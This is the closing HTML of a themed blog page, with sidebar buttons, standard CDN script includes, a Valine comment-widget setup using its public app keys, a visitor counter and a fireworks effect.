id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const initData = {
+      el: '#vcomment',
+      appId: '8zpT8ubnMCs0p3vahHLvnomJ-gzGzoHsz',
+      appKey: 'QjoNCC6qtXBclb6ll0XkwEbV',
+      placeholder: 'Please leave your footprints',
+      avatar: 'wavatar',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script></div></body></html>
